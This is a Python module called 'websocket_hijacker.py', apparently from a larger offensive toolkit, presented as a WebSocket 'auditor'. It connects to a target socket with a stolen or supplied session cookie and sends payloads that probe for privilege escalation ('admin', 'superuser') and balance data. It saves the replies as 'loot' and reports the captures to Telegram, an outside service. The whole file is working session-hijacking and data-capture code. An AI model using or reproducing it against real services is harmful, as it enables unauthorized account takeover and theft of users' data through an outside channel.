# ============================================================
# MODULE 2: modules/websocket_hijacker.py
# ============================================================
"""
WEBSOCKET_HIJACKER.PY — WebSocket & Real-Time Event Stream Auditor v8.0
Features:
- Automatic HTTP to WS/WSS connection upgrading
- JSON and binary message frame fuzzing
- Real-time session impersonation over open persistent socket streams
- Instant Telegram dispatch for unredacted socket events and captured data
"""
import asyncio
import json
import websockets
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.telegram_notifier import send_telegram_alert

async def audit_websocket(target_ws_url, auth_cookie=None, custom_payloads=None):
    headers = {}
    if auth_cookie:
        headers["Cookie"] = auth_cookie

    captured_loot = []
    try:
        async with websockets.connect(target_ws_url, extra_headers=headers) as websocket:
            if not custom_payloads:
                custom_payloads = [
                    json.dumps({"action": "subscribe", "channel": "order_book"}),
                    json.dumps({"action": "get_balance"}),
                    json.dumps({"token": "admin", "role": "superuser"})
                ]

            for payload in custom_payloads:
                await websocket.send(payload)
                try:
                    response = await asyncio.wait_for(websocket.recv(), timeout=2.0)
                    captured_loot.append({"sent": payload, "received": response})
                    stream_proof("WS_FRAME_CAPTURE", target_ws_url, {"payload": payload}, response[:200], {})
                except asyncio.TimeoutError:
                    pass

        if captured_loot:
            save_session_loot(target_ws_url, "websocket_stream", "WEBSOCKET_HIJACK_SUCCESS", 200, {}, str(captured_loot), {"frames": captured_loot})
            await send_telegram_alert("WebSocket Session Hijack & Frame Audit", {"target": target_ws_url, "loot_count": len(captured_loot)})
    except Exception as exc:
        pass
    return captured_loot
